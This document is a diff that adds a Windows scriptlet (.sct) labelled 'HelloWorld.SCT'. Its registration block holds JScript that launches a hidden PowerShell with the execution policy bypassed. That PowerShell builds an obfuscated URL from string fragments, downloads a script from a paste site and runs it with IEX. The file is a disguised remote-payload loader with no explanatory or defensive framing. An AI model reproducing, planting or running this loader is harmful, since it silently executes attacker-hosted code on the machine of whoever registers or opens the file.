@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <registration
+    progid="HelloWorld.SCT"
+    classid="{11111111-1111-1111-1111-111111111111}">
+    <script language="JScript">
+      <![CDATA[
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell.exe -windowstyle hidden -nop -exec bypass -c \"$w=New-Object Net.WebClient;$u=('https'+'://nopas'+'te.net/'+'Hu'+'JXMl'+'fuui');IEX $w.DownloadString($u)\"");
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
